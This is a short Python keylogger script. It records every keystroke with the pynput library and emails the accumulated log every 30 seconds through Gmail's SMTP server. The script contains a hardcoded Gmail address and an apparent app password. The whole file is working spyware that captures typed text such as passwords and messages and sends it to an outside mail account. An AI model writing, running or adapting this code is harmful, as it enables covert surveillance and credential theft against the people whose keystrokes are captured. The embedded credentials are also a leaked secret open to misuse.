import pynput.keyboard
#from pynput import keyboard
import smtplib
import threading

log = ""

def callback_fuction(key):

    global log

    try:
        log += str(key.char)
        #log += log.encode + key.char.encode("utf-8")

    except AttributeError:

        if key == key.space:
            log += " "

        else:

            log += str(key)

    except:

        pass

    print(log)

def send_email(email,password,message):

    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()



keylogger_listener = pynput.keyboard.Listener(on_press=callback_fuction)

def thread_function():

    global log
    send_email("ricktwdgrimes1973@gmail.com","gsom spgs rfsv ccio",log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()

#threading
with keylogger_listener:

    thread_function()
    keylogger_listener.join()


